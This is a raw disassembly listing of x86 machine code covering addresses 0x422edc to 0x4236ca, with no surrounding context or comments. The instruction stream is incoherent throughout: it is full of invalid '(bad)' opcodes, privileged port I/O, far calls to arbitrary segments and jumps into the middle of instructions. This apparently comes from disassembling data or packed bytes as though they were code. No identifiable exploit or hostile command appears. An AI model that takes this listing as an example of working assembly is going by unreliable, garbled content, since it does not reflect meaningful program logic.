  422edc:	call   0x2972:0xd6bd933d
  422ee3:	enter  0x1380,0xfc
  422ee7:	loopne 0x422f3b
  422ee9:	lds    eax,FWORD PTR [esp+edi*8]
  422eec:	js     0x422eab
  422eee:	mov    ah,0x7
  422ef0:	inc    DWORD PTR [ebx]
  422ef2:	xor    cl,0x70
  422ef5:	cmp    BYTE PTR [edi],dh
  422ef7:	out    0xc7,eax
  422ef9:	mov    ecx,0xa5ead42f
  422efe:	add    ch,BYTE PTR [esi]
  422f00:	xchg   edi,eax
  422f01:	push   0x4c7e3c01
  422f06:	sbb    edi,DWORD PTR [ecx+ecx*8-0x2d]
  422f0a:	ss ret 0xc093
  422f0e:	push   esp
  422f0f:	(bad)  
  422f10:	mov    dh,0x25
  422f12:	push   ebp
  422f13:	push   ds
  422f14:	jb     0x422eec
  422f16:	sahf   
  422f17:	idiv   eax
  422f19:	pop    es
  422f1a:	xor    al,0xc9
  422f1c:	enter  0x8783,0xc4
  422f20:	jle    0x422ede
  422f22:	dec    edi
  422f23:	ret    
  422f24:	inc    ecx
  422f25:	loop   0x422ec0
  422f27:	dec    ecx
  422f28:	dec    DWORD PTR [ebx]
  422f2a:	mov    cl,bl
  422f2c:	sub    DWORD PTR [edi+0x5e9f7d21],esi
  422f32:	(bad)  
  422f33:	jge    0x422f78
  422f35:	sbb    dl,al
  422f37:	fucomp st(3)
  422f39:	mov    ch,0xc3
  422f3b:	mov    edx,0xbf49a22f
  422f40:	sti    
  422f41:	pop    ebp
  422f42:	test   al,0x94
  422f44:	jmp    0x422f9f
  422f46:	int    0x25
  422f48:	sbb    edx,0xffffff90
  422f4b:	out    dx,eax
  422f4c:	jg     0x422f9f
  422f4e:	sbb    BYTE PTR [ebp-0x76],0x95
  422f52:	sbb    BYTE PTR [ecx+eax*4+0x2ed22c63],dl
  422f59:	cmp    DWORD PTR [ebx-0x28],ebp
  422f5c:	jo     0x422f31
  422f5e:	aas    
  422f5f:	data16 adc ch,BYTE PTR [edi+eax*4+0x28111283]
  422f67:	hlt    
  422f68:	out    0xed,eax
  422f6a:	out    0x7d,al
  422f6c:	jecxz  0x422ef2
  422f6e:	xor    bl,BYTE PTR [ecx]
  422f70:	inc    ebp
  422f71:	fsub   st,st(6)
  422f73:	sbb    al,0x9e
  422f75:	pop    ebx
  422f76:	mov    DWORD PTR [ebx+0x5dfc5112],edi
  422f7c:	sahf   
  422f7d:	adc    dl,BYTE PTR [edx+0x6b14c2a7]
  422f83:	dec    ebx
  422f84:	cwde   
  422f85:	sbb    eax,0x74413925
  422f8a:	fwait
  422f8b:	xchg   ebp,eax
  422f8c:	test   eax,0x58fc9f7a
  422f91:	cmp    ah,dl
  422f93:	xchg   DWORD PTR [edi],esp
  422f95:	or     cl,al
  422f97:	fldcw  WORD PTR [ecx-0x4745e516]
  422f9d:	mov    ebp,0x67f08ee0
  422fa2:	loop   0x422fd9
  422fa4:	repz (bad) 
  422fa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fa7:	out    0x2,al
  422fa9:	cld    
  422faa:	inc    edi
  422fab:	or     cl,ch
  422fad:	inc    eax
  422fae:	in     al,0x4f
  422fb0:	and    bl,BYTE PTR [eax+0x969157]
  422fb6:	gs mov ebx,0x8c730112
  422fbc:	(bad)  
  422fbd:	push   esi
  422fbe:	loop   0x422fd7
  422fc0:	xor    DWORD PTR [esi-0x4],ebx
  422fc3:	fisttp QWORD PTR ds:0x1ffecfa8
  422fc9:	nop
  422fca:	push   ebx
  422fcb:	sbb    BYTE PTR [eax+0x43],dl
  422fce:	inc    ebp
  422fcf:	xchg   edx,eax
  422fd0:	mov    eax,ds:0xf58bed51
  422fd5:	mov    al,0xad
  422fd7:	out    0x3b,al
  422fd9:	or     eax,0xbe4f8b6d
  422fde:	cdq    
  422fdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422fe0:	ret    0xfd1
  422fe3:	lea    esi,[ecx+0x6abb0ee1]
  422fe9:	imul   esi,DWORD PTR [edx+0x3ca1408a],0x6d
  422ff0:	inc    esi
  422ff1:	out    0xe2,al
  422ff3:	sbb    eax,ebp
  422ff5:	call   0xcec879b6
  422ffa:	pop    eax
  422ffb:	inc    ebx
  422ffc:	cdq    
  422ffd:	cmc    
  422ffe:	sub    dh,BYTE PTR [edx-0x44]
  423001:	mov    dl,0x1e
  423003:	imul   ecx,DWORD PTR [edx-0x71],0xcdc38e68
  42300a:	out    dx,al
  42300b:	aad    0xc0
  42300d:	out    0xa4,eax
  42300f:	jb     0x422fd3
  423011:	or     al,0x82
  423013:	icebp  
  423014:	mov    BYTE PTR [ebp-0x1e77c053],al
  42301a:	ret    0x8403
  42301d:	bnd js 0x423037
  423020:	das    
  423021:	aaa    
  423022:	(bad)  
  423024:	cmp    eax,0x483fb19f
  423029:	pop    es
  42302a:	fcom   DWORD PTR [edx+0x2089dc78]
  423030:	add    al,0x6c
  423032:	cmp    al,0xc8
  423034:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423035:	add    edx,DWORD PTR [ebx]
  423037:	xor    al,bl
  423039:	ffree  st(0)
  42303b:	int3   
  42303c:	pop    esi
  42303d:	push   eax
  42303e:	in     al,0x21
  423040:	cmc    
  423041:	and    al,0x56
  423043:	mov    eax,ds:0x3cc541a9
  423048:	dec    eax
  423049:	adc    DWORD PTR [ebx-0x35a59b73],ebx
  42304f:	aaa    
  423050:	jg     0x423035
  423052:	xor    edx,DWORD PTR [esi+eiz*1-0x5c]
  423056:	stos   BYTE PTR es:[edi],al
  423057:	cwde   
  423058:	aam    0x61
  42305a:	retf   
  42305b:	psubsb mm3,QWORD PTR [ecx+0x68]
  42305f:	jp     0x423040
  423061:	mov    eax,0xd768e641
  423066:	sbb    DWORD PTR [ecx+0x6a],esp
  423069:	mov    dl,ch
  42306b:	pop    edx
  42306c:	and    al,BYTE PTR [eax]
	...
  42307a:	repnz rol BYTE PTR ds:0xf6d53751,0xe3
  423082:	test   BYTE PTR [eax],0xec
  423085:	inc    esi
  423086:	xor    eax,0xa4196784
  42308b:	stos   BYTE PTR es:[edi],al
  42308c:	add    DWORD PTR [eax],eax
  42308e:	sti    
  42308f:	add    DWORD PTR [eax],eax
  423091:	add    BYTE PTR [edi-0x67f9440f],al
  423097:	(bad)  
  423098:	div    esi
  42309a:	xchg   esi,eax
  42309b:	inc    ecx
  42309c:	fs xor al,0x1f
  42309f:	mov    bh,0x6b
  4230a1:	sbb    eax,ecx
  4230a3:	and    bl,BYTE PTR [edi+0x1]
  4230a6:	jg     0x42308b
  4230a8:	mov    ecx,0x70107584
  4230ad:	nop
  4230ae:	push   0xacce95dd
  4230b3:	pop    es
  4230b4:	lods   al,BYTE PTR ds:[esi]
  4230b5:	jecxz  0x4230a3
  4230b7:	cli    
  4230b8:	pop    ecx
  4230b9:	sbb    BYTE PTR ss:[eax+0x5a],0x23
  4230be:	add    ebx,ebx
  4230c0:	pop    ebp
  4230c1:	pop    edx
  4230c2:	cwde   
  4230c3:	jne    0x423144
  4230c5:	dec    edx
  4230c6:	(bad)  
  4230c7:	(bad)  [edi+eiz*4-0x2628a6ee]
  4230ce:	sbb    eax,0x2b234c09
  4230d3:	mov    edi,0x9d5ea66a
  4230d8:	add    DWORD PTR [ebx-0x4749116d],ebx
  4230de:	fldenv [ecx+0x41486364]
  4230e4:	push   ss
  4230e5:	and    al,0x54
  4230e8:	in     al,0x80
  4230ea:	ror    BYTE PTR [eax],0xe0
  4230ed:	int3   
  4230ee:	and    dl,dh
  4230f0:	(bad)
  4230f4:	lahf   
  4230f5:	fild   DWORD PTR [esp+edx*8+0x10]
  4230f9:	dec    BYTE PTR [edx+0x3f4ee9e7]
  4230ff:	retf   0x1ee
  423102:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423103:	sub    eax,0x73828343
  423108:	xor    eax,0xd0ba6b98
  42310d:	je     0x423115
  42310f:	and    eax,edx
  423111:	fistp  WORD PTR [edi]
  423113:	fdivr  st(2),st
  423115:	ss xchg edi,eax
  423117:	bound  esi,QWORD PTR [edx-0x75a7c806]
  42311d:	imul   ecx,DWORD PTR [eax+0x108b65ae],0x46
  423124:	or     eax,0x8d986e9f
  423129:	mov    ch,0x34
  42312b:	jnp    0x42310f
  42312d:	and    BYTE PTR [edi],bl
  42312f:	pop    ds
  423130:	push   edi
  423131:	mov    dl,BYTE PTR [esp+edi*1+0x2e669417]
  423138:	inc    ecx
  423139:	and    eax,0x7780c772
  42313e:	loope  0x4230ca
  423140:	jmp    0xf6c2:0x7462ca1f
  423147:	sbb    DWORD PTR [edi+edx*8-0x1a],ebp
  42314b:	xlat   BYTE PTR ds:[ebx]
  42314c:	sti    
  42314d:	jne    0x42310b
  42314f:	ins    BYTE PTR es:[edi],dx
  423150:	imul   esp,DWORD PTR [edi+ebp*4-0x5f],0xb8a3744
  423158:	imul   esi,DWORD PTR [eax-0x2d],0xeaadc3b1
  42315f:	(bad)  
  423160:	dec    BYTE PTR [eax-0x781ae208]
  423166:	outs   dx,DWORD PTR ds:[esi]
  423167:	orps   xmm4,XMMWORD PTR [ecx]
  42316a:	pop    esp
  42316b:	addr16 jnp 0x4230f1
  42316e:	mov    ?,WORD PTR [esi-0x6775c326]
  423174:	fisub  DWORD PTR [esi+0x69c3d014]
  42317a:	sbb    BYTE PTR [ebp-0x36],dl
  42317d:	lods   al,BYTE PTR ds:[esi]
  42317e:	sbb    BYTE PTR [eax+0x27],bl
  423181:	rol    ch,cl
  423183:	lds    ecx,FWORD PTR [esi-0x62]
  423186:	adc    al,0x68
  423188:	std    
  423189:	lds    edi,FWORD PTR [ecx+0x6e]
  42318c:	add    ebp,DWORD PTR [ebx+0x59]
  42318f:	(bad)
  423192:	adc    edx,DWORD PTR [ebx+edx*2+0x43dfbb9a]
  423199:	pop    esp
  42319a:	call   0xfa8e:0x44d53967
  4231a1:	shr    DWORD PTR [edx],cl
  4231a3:	scas   al,BYTE PTR es:[edi]
  4231a4:	lds    ecx,FWORD PTR [ecx-0x5d]
  4231a7:	mov    ah,0x4b
  4231a9:	inc    edx
  4231aa:	je     0x42318d
  4231ac:	xor    eax,0x4478d4ad
  4231b1:	inc    edi
  4231b2:	adc    ecx,DWORD PTR ds:0x31ed2239
  4231b8:	sub    eax,DWORD PTR [eax]
  4231ba:	(bad)  
  4231bb:	push   edi
  4231bc:	or     BYTE PTR [esi-0x7a04544d],0x97
  4231c3:	pop    ss
  4231c4:	aaa    
  4231c5:	add    esi,DWORD PTR ds:0xc49a3667
  4231cb:	test   BYTE PTR [eax+0x12],bl
  4231ce:	xchg   ecx,eax
  4231cf:	fiadd  WORD PTR [ebp+0x5e]
  4231d2:	lock jg 0x4231fb
  4231d5:	bound  edi,QWORD PTR [edi+0x7a]
  4231d8:	sbb    cl,dl
  4231da:	xchg   edx,eax
  4231db:	ret    
  4231dc:	out    dx,eax
  4231dd:	jmp    eax
  4231df:	scas   eax,DWORD PTR es:[edi]
  4231e0:	(bad)  
  4231e1:	repnz xor ebx,ebp
  4231e4:	call   0x2ead51f4
  4231e9:	sbb    dh,ah
  4231eb:	cwde   
  4231ec:	loopne 0x4231bb
  4231ee:	dec    eax
  4231ef:	add    ebp,ebp
  4231f1:	sbb    BYTE PTR [edx+0x77],bh
  4231f4:	les    eax,FWORD PTR [edx-0x4c]
  4231f7:	xchg   esp,eax
  4231f8:	aaa    
  4231f9:	iret   
  4231fa:	push   0xffffffc0
  4231fc:	inc    ebx
  4231fd:	xchg   ebp,eax
  4231fe:	fadd   DWORD PTR [ebp+ebp*8+0x4f]
  423202:	pop    esi
  423203:	daa    
  423204:	lahf   
  423205:	push   ebp
  423206:	push   es
  423207:	and    ch,BYTE PTR [edi-0x41b51245]
  42320d:	inc    ebx
  42320e:	cmp    DWORD PTR [esi],edi
  423210:	repnz pop es
  423212:	(bad)  
  423214:	cmp    al,0x2c
  423216:	scas   eax,DWORD PTR es:[edi]
  423217:	mov    esp,0xc1f593e9
  42321c:	xchg   ebp,eax
  42321d:	add    eax,DWORD PTR [ebx+0x52b431b9]
  423223:	fcomi  st,st(0)
  423225:	inc    ebx
  423226:	cmc    
  423227:	je     0x42321a
  423229:	frstor [ebp-0x4c]
  42322c:	mov    ds:0x96872e62,eax
  423231:	stc    
  423232:	in     eax,dx
  423233:	pop    ds
  423234:	add    eax,0x7478be8a
  423239:	popf   
  42323a:	lea    ebp,[edi-0x46aea830]
  423240:	out    0xa3,al
  423242:	ret    
  423243:	pop    ds
  423244:	and    al,0x47
  423246:	fwait
  423247:	repz shl DWORD PTR [ecx],1
  42324a:	xor    al,0xc
  42324c:	push   ecx
  42324d:	inc    eax
  42324e:	jp     0x4232ab
  423250:	pop    DWORD PTR [ebx-0x2ca2e525]
  423256:	lea    eax,[ecx-0x2d]
  423259:	scas   eax,DWORD PTR es:[edi]
  42325a:	lods   eax,DWORD PTR ds:[esi]
  42325b:	cdq    
  42325c:	retf   0xa8e0
  42325f:	pop    esp
  423260:	mov    ds:0xeb9bb954,al
  423265:	iret   
  423266:	das    
  423267:	jbe    0x423269
  423269:	in     eax,0x2e
  42326b:	into   
  42326c:	pop    ecx
  42326d:	in     eax,dx
  42326e:	jmp    0x423207
  423270:	and    bl,BYTE PTR [esi]
  423272:	sbb    ch,al
  423274:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423275:	loop   0x423209
  423277:	inc    esi
  423278:	mov    ecx,0xa61f3734
  42327d:	stc    
  42327e:	mov    WORD PTR [eax],fs
  423280:	stos   BYTE PTR es:[edi],al
  423281:	jmp    0x42325d
  423283:	push   ecx
  423284:	jo     0x423238
  423286:	and    al,0x88
  423288:	ret    
  423289:	mov    ch,BYTE PTR [edx+0x40b3]
	...
  423297:	add    BYTE PTR [eax],al
  423299:	add    BYTE PTR [ebx+0x41],al
  42329c:	popa   
  42329d:	data16 arpl WORD PTR [esi+0x47],sp
  4232a1:	gs push cs
  4232a3:	mov    BYTE PTR [edi-0x37],bh
  4232a6:	xlat   BYTE PTR ds:[ebx]
  4232a7:	daa    
  4232a8:	or     eax,0x1ac9fca
  4232ad:	add    bl,bh
  4232af:	add    DWORD PTR [eax],eax
  4232b1:	add    cl,dh
  4232b3:	adc    bh,BYTE PTR [eax]
  4232b5:	xchg   esi,eax
  4232b6:	sbb    al,cl
  4232b8:	fnstsw WORD PTR [edi]
  4232ba:	cmp    esi,ecx
  4232bc:	xchg   ebx,eax
  4232bd:	xor    al,0xb1
  4232bf:	iret   
  4232c0:	jne    0x423292
  4232c2:	in     eax,dx
  4232c3:	arpl   WORD PTR [esi],dx
  4232c5:	cmp    si,WORD PTR [bp-0x701c]
  4232cb:	lahf   
  4232cc:	jecxz  0x4232b9
  4232ce:	in     al,0xc2
  4232d0:	stos   DWORD PTR es:[edi],eax
  4232d1:	out    dx,eax
  4232d2:	(bad)  
  4232d3:	stos   BYTE PTR es:[edi],al
  4232d4:	mov    esi,0x416bc1fb
  4232d9:	lods   eax,DWORD PTR ds:[esi]
  4232da:	cs sub al,0x95
  4232dd:	fadd   DWORD PTR [ebx+0x4ec745a9]
  4232e3:	bound  edx,QWORD PTR [esi-0x1f]
  4232e6:	xor    DWORD PTR [ebx+0xa],edx
  4232e9:	fsubr  QWORD PTR [edi]
  4232eb:	xchg   ebp,eax
  4232ec:	cmp    DWORD PTR [ebx],ecx
  4232ee:	out    0x4e,al
  4232f0:	in     eax,0xc6
  4232f2:	mov    WORD PTR [ebp-0x27d9e7be],ds
  4232f8:	mov    al,0xbe
  4232fa:	or     al,0x9b
  4232fc:	shl    dh,0x2
  4232ff:	in     al,0x1f
  423301:	push   esi
  423302:	in     eax,dx
  423303:	sbb    eax,0x9f86cae7
  423308:	push   0xaad8ee96
  42330d:	xchg   esp,eax
  42330e:	lods   eax,DWORD PTR ds:[esi]
  42330f:	mov    ds:0xf25e6b3b,al
  423314:	mov    edi,0xa0839d7d
  423319:	fs xor al,0x41
  42331c:	dec    ebx
  42331d:	dec    ecx
  42331e:	dec    esi
  42331f:	jp     0x4233a0
  423321:	ins    DWORD PTR es:[edi],dx
  423322:	xor    DWORD PTR [eax+0x7b],esi
  423325:	lahf   
  423326:	mov    bl,0xb8
  423328:	adc    edx,eax
  42332a:	adc    DWORD PTR [eax+0x2b],edi
  42332d:	xchg   esi,eax
  42332e:	mov    eax,ds:0xf868ec1b
  423333:	mov    esp,0xbe11450d
  423338:	inc    esp
  423339:	push   edx
  42333a:	nop
  42333b:	mov    ebx,esi
  42333d:	mov    al,ds:0xf2d345a3
  423342:	dec    edx
  423343:	or     edi,DWORD PTR [eax+ebp*8+0x67]
  423347:	shr    BYTE PTR [eax-0x5a3e2587],1
  42334d:	js     0x423330
  42334f:	jecxz  0x4232e8
  423351:	ret    0xc5ff
  423354:	xchg   edi,eax
  423355:	xor    ecx,edi
  423357:	inc    edi
  423358:	or     eax,0x43f966e3
  42335d:	fstp   DWORD PTR [esp+edx*1-0xd02382b]
  423364:	gs scas al,BYTE PTR es:[edi]
  423366:	lds    eax,FWORD PTR [esi]
  423368:	mov    bh,0x19
  42336a:	push   esp
  42336b:	in     al,0x40
  42336d:	nop
  42336e:	add    ah,BYTE PTR [eax+0x5cfb6c5]
  423374:	jecxz  0x4233f1
  423376:	fistp  DWORD PTR [ebp+0x177b76fc]
  42337c:	jnp    0x423327
  42337e:	dec    eax
  42337f:	pop    ebp
  423380:	lock iret 
  423382:	in     al,dx
  423383:	push   eax
  423384:	and    al,0x42
  423386:	pop    esp
  423387:	jg     0x423399
  423389:	das    
  42338a:	ficom  DWORD PTR ds:0x619ff0e0
  423390:	in     eax,dx
  423391:	xlat   BYTE PTR ds:[ebx]
  423392:	add    DWORD PTR [edi+eax*1],edi
  423395:	jns    0x423317
  423397:	retf   
  423398:	js     0x423331
  42339a:	cmp    ch,al
  42339c:	dec    eax
  42339d:	add    edx,esi
  42339f:	sbb    DWORD PTR [edi+ebx*1],esp
  4233a2:	imul   BYTE PTR ds:0x6f0b0f79
  4233a8:	cmc    
  4233a9:	inc    edi
  4233aa:	and    al,0x18
  4233ac:	jecxz  0x423412
  4233ae:	or     eax,0xd73c21c0
  4233b3:	cld    
  4233b4:	aas    
  4233b5:	xchg   esp,eax
  4233b6:	idiv   ebp
  4233b8:	inc    ebx
  4233b9:	dec    edi
  4233ba:	adc    eax,0x8f01cece
  4233bf:	push   ecx
  4233c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233c1:	lea    edi,[ebx-0x5a6fec6e]
  4233c7:	adc    eax,0x5e3dcfdf
  4233cc:	cmp    al,0x53
  4233ce:	adc    DWORD PTR [edx+0x9],0xeab5bb9f
  4233d5:	gs test esp,ebx
  4233d8:	jl     0x4233aa
  4233da:	not    BYTE PTR [ebx+0x44]
  4233dd:	js     0x42343a
  4233df:	cmc    
  4233e0:	push   ss
  4233e1:	adc    BYTE PTR [esi+edx*1-0x4],ch
  4233e5:	xchg   esi,eax
  4233e6:	leave  
  4233e7:	div    BYTE PTR [ecx-0x2e]
  4233ea:	push   0x196132ac
  4233ef:	push   edx
  4233f0:	mov    BYTE PTR [ecx],0x7e
  4233f3:	dec    ebx
  4233f4:	rol    DWORD PTR [ebx-0x5cbe6f9a],0xce
  4233fb:	and    DWORD PTR [ecx],ebp
  4233fd:	je     0x42338a
  4233ff:	pusha  
  423400:	outs   dx,BYTE PTR ds:[esi]
  423401:	loope  0x42344a
  423403:	sbb    esi,DWORD PTR ds:0xcbf3af76
  423409:	shr    BYTE PTR [esi+0x7d],1
  42340c:	ins    DWORD PTR es:[edi],dx
  42340d:	dec    esp
  42340e:	cmp    cl,dh
  423410:	jmp    0xa2887c37
  423415:	sahf   
  423416:	cs pop ebx
  423418:	lock jb 0x42345e
  42341b:	dec    eax
  42341c:	arpl   WORD PTR [ecx],sp
  42341e:	aam    0x73
  423420:	lods   al,BYTE PTR ds:[esi]
  423421:	fidiv  DWORD PTR [eax-0x5]
  423424:	mov    esi,0x51ae2b1d
  423429:	inc    ecx
  42342a:	(bad)  
  42342b:	(bad)  
  42342c:	popf   
  42342d:	aam    0x96
  42342f:	retf   
  423430:	push   ebx
  423431:	sub    DWORD PTR [eax],esi
  423433:	adc    edi,esp
  423435:	add    edi,DWORD PTR [esi+esi*4]
  423438:	cli    
  423439:	sub    eax,0xaca946cc
  42343e:	inc    edi
  42343f:	enter  0x3b1b,0x14
  423443:	add    bl,BYTE PTR [eax]
  423445:	mov    ds,WORD PTR [esp+esi*2+0xc592101]
  42344c:	stos   BYTE PTR es:[edi],al
  42344d:	adc    eax,0x74281523
  423452:	gs push cs
  423454:	adc    eax,0xe0710d84
  423459:	add    eax,0x488a60df
  42345e:	xor    BYTE PTR [eax-0x17c8a752],ah
  423464:	push   ecx
  423465:	sbb    BYTE PTR [ecx+esi*4-0x65],ch
  423469:	dec    eax
  42346a:	dec    ecx
  42346b:	inc    ecx
  42346c:	xchg   BYTE PTR [ebx+0x3c3c80d1],bh
  423472:	rcr    DWORD PTR [edx-0x608885e],cl
  423478:	(bad)  
  423479:	inc    esi
  42347a:	cmp    al,0x17
  42347c:	add    esp,DWORD PTR [ecx]
  42347e:	inc    edx
  42347f:	jbe    0x42345b
  423481:	adc    esp,ebp
  423483:	test   ebx,ebx
  423485:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423486:	test   DWORD PTR [eax+0xbc33697],esp
  42348c:	bound  ebx,QWORD PTR [ecx-0x389e9983]
  423492:	loope  0x423512
  423494:	jns    0x42341b
  423496:	into   
  423497:	daa    
  423498:	repnz push ss
  42349a:	aad    0x26
  42349c:	dec    ebp
  42349d:	and    eax,0xb116a65f
  4234a2:	in     eax,dx
  4234a3:	push   es
  4234a4:	xlat   BYTE PTR ds:[ebx]
  4234a5:	mov    WORD PTR [edx+0x7a],ds
  4234a8:	imul   ebp,DWORD PTR [ecx+0xbc285e],0x0
	...
  4234b7:	add    BYTE PTR [eax],al
  4234b9:	add    BYTE PTR [ebx-0xce42c16],cl
  4234bf:	cmp    ecx,ebx
  4234c1:	cli    
  4234c2:	cmp    dh,bl
  4234c4:	adc    BYTE PTR [ebx],dl
  4234c6:	mov    eax,ds:0x9a000870
  4234cb:	scas   al,BYTE PTR es:[edi]
  4234cc:	add    DWORD PTR [eax],eax
  4234ce:	sti    
  4234cf:	add    DWORD PTR [eax],eax
  4234d1:	add    BYTE PTR [esi+ebx*2+0x7081b6ee],bh
  4234d8:	aas    
  4234d9:	pop    esp
  4234da:	inc    ecx
  4234db:	(bad)  [ecx]
  4234dd:	lods   al,BYTE PTR ds:[esi]
  4234de:	adc    edx,DWORD PTR [bx+si]
  4234e1:	sbb    BYTE PTR [edi],bl
  4234e3:	aaa    
  4234e4:	cmp    dl,BYTE PTR [esi]
  4234e6:	inc    esi
  4234e7:	mov    al,ds:0xb2cb9e0d
  4234ec:	fsubr  QWORD PTR [edi]
  4234ee:	mov    ecx,0xd911d682
  4234f3:	cmp    eax,0x7cd18290
  4234f8:	shl    al,cl
  4234fa:	hlt    
  4234fb:	sbb    eax,0x33e15202
  423500:	cmp    al,0x61
  423502:	pop    edx
  423503:	in     al,dx
  423504:	div    al
  423506:	xchg   ecx,eax
  423507:	ds test al,0x6e
  42350a:	ficom  WORD PTR [edx-0x4efa95e3]
  423510:	fdivr  DWORD PTR [edx]
  423512:	sahf   
  423513:	(bad)  
  423514:	frstor [ebx-0x57]
  423517:	and    al,0x72
  423519:	shr    BYTE PTR [edx],1
  42351b:	cmc    
  42351c:	(bad)  
  42351d:	iret   
  42351e:	arpl   di,di
  423520:	xchg   edx,eax
  423521:	das    
  423522:	jne    0x423597
  423524:	lea    esp,[edi]
  423526:	fidivr WORD PTR ds:[eax+0x52]
  42352a:	icebp  
  42352b:	add    al,BYTE PTR [esi+0x35]
  42352e:	sbb    ah,BYTE PTR [esi]
  423530:	jle    0x42355d
  423532:	xchg   esi,eax
  423533:	fsub   QWORD PTR [edi-0xacb4af4]
  423539:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42353a:	mov    ds:0x103be691,al
  42353f:	loopne 0x42359d
  423541:	leave  
  423542:	xor    BYTE PTR [eax-0x13],al
  423545:	lahf   
  423546:	cli    
  423547:	mov    ds:0xc81ec433,eax
  42354c:	jle    0x4234fc
  42354e:	int3   
  42354f:	out    dx,eax
  423550:	or     bh,BYTE PTR [eax]
  423552:	mov    DWORD PTR [ecx-0x39],ebx
  423555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423556:	test   DWORD PTR [ebx],ecx
  423558:	mov    ebx,0x11ebfa9f
  42355d:	dec    esi
  42355e:	test   al,0xc0
  423560:	jl     0x4235b4
  423562:	int3   
  423563:	popf   
  423564:	imul   edx,DWORD PTR [eax+eax*2+0x50],0x74bbb057
  42356c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42356d:	out    dx,al
  42356e:	and    eax,DWORD PTR [eax-0x31255af1]
  423574:	add    BYTE PTR [edx+0x7007a246],0x21
  42357b:	jne    0x4235bf
  42357d:	pop    ebp
  42357e:	psubsw mm0,QWORD PTR [esi-0x258d28bc]
  423585:	adc    al,0x85
  423587:	mulps  xmm6,XMMWORD PTR ds:0xf291e9d8
  42358e:	mov    eax,ds:0x8672c9d2
  423593:	push   ebx
  423594:	jmp    DWORD PTR es:[ecx+eiz*8+0x1b]
  423599:	mov    ebp,0x1a9ce1bb
  42359e:	xchg   esi,eax
  42359f:	inc    esp
  4235a0:	inc    edx
  4235a1:	rcl    BYTE PTR [eax+0x66caf40a],0x2
  4235a8:	or     DWORD PTR [ebp+0x71],esp
  4235ab:	inc    edi
  4235ac:	shr    BYTE PTR [ecx],0x56
  4235af:	dec    BYTE PTR [eax]
  4235b1:	xor    esp,DWORD PTR [edi]
  4235b3:	mov    ds:0xcf8b85c0,eax
  4235b8:	inc    eax
  4235b9:	adc    BYTE PTR [esp+eax*4],bl
  4235bc:	sbb    eax,0x3eb0697f
  4235c1:	cmp    ebp,DWORD PTR [edi+0x72bbecee]
  4235c7:	push   ecx
  4235c8:	push   eax
  4235c9:	pop    ds
  4235ca:	adc    ch,BYTE PTR [edx+0xe]
  4235cd:	pop    ds
  4235ce:	or     esi,esp
  4235d0:	add    BYTE PTR [edx-0x20],0x13
  4235d4:	jae    0x4235bb
  4235d6:	or     BYTE PTR [edi-0x27c163c4],dh
  4235dc:	add    eax,DWORD PTR [edx+ebp*8+0x4b]
  4235e0:	push   esp
  4235e1:	or     edx,ebp
  4235e3:	popa   
  4235e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4235e5:	jge    0x4235b6
  4235e7:	jmp    0x92b4ec68
  4235ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4235ed:	les    ebp,FWORD PTR [esi+ebp*2-0x381468b8]
  4235f4:	xor    dl,BYTE PTR [edi+0x69b95b85]
  4235fa:	xor    al,0xf9
  4235fc:	mov    edx,0xdc22feb1
  423601:	int    0x7b
  423603:	ins    DWORD PTR es:[edi],dx
  423604:	jmp    0xa0040551
  423609:	adc    BYTE PTR [ecx-0x1728b5fc],0xe6
  423610:	ret    0xdb33
  423613:	and    BYTE PTR [ebx+0x4a],ah
  423616:	loope  0x4235cb
  423618:	jg     0x4235e4
  42361a:	clc    
  42361b:	pop    edi
  42361c:	js     0x42363f
  42361e:	nop
  42361f:	mov    eax,0x92efdccc
  423624:	mov    ecx,0x869e18b4
  423629:	int3   
  42362a:	leave  
  42362b:	jb     0x423600
  42362d:	dec    eax
  42362e:	inc    DWORD PTR [eax]
  423630:	mov    ds:0x38932b2b,eax
  423635:	fisttp WORD PTR [ebx+0x39]
  423638:	sahf   
  423639:	add    eax,0x8a6a778f
  42363e:	and    eax,ebx
  423640:	mov    eax,0xe32fb4ef
  423645:	sub    al,0x74
  423647:	lahf   
  423648:	add    eax,0x86bae385
  42364d:	adc    al,BYTE PTR [ebx+0x36bafaa0]
  423653:	push   0xe4d520a2
  423658:	cmp    eax,0x195fea78
  42365d:	mov    bh,0x36
  42365f:	clc    
  423660:	call   0x826c:0xa24f374c
  423667:	inc    ecx
  423668:	pop    es
  423669:	push   0x29
  42366b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42366c:	mov    ch,0xcb
  42366e:	jp     0x42362d
  423670:	pop    edx
  423671:	(bad)  
  423672:	and    al,0xcf
  423674:	std    
  423675:	rcl    DWORD PTR [esi+0x3b],0xb2
  423679:	sub    eax,0xbe2e55c7
  42367e:	stos   BYTE PTR es:[edi],al
  42367f:	dec    esp
  423680:	push   0x2f5d86f4
  423685:	outs   dx,BYTE PTR ds:[esi]
  423686:	push   ecx
  423687:	mov    ds:0x18c06326,eax
  42368c:	mov    ds:0x406e2ee5,eax
  423691:	cmp    dh,BYTE PTR [edx-0x22]
  423694:	push   ebx
  423695:	sub    al,0xd2
  423697:	leave  
  423698:	mov    BYTE PTR [esi-0x43d5866b],ch
  42369e:	and    dl,BYTE PTR [esi-0x70]
  4236a1:	xor    bh,dh
  4236a3:	cmp    eax,0x6b69aa6a
  4236a8:	xchg   DWORD PTR [ebx+0x4a7507d4],ecx
  4236ae:	mov    dh,BYTE PTR [ebx-0x44adff50]
  4236b4:	out    dx,eax
  4236b5:	pop    ss
  4236b6:	lock bnd fs jle 0x4236f0
  4236bb:	mov    bl,0x8
  4236bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236be:	mov    ch,0x57
  4236c0:	add    edx,DWORD PTR [eax-0x5d]
  4236c3:	mov    ?,WORD PTR [edi-0x23]
  4236c6:	orps   xmm4,xmm2
  4236c9:	stos   DWORD PTR es:[edi],eax
  4236ca:	inc    ebx
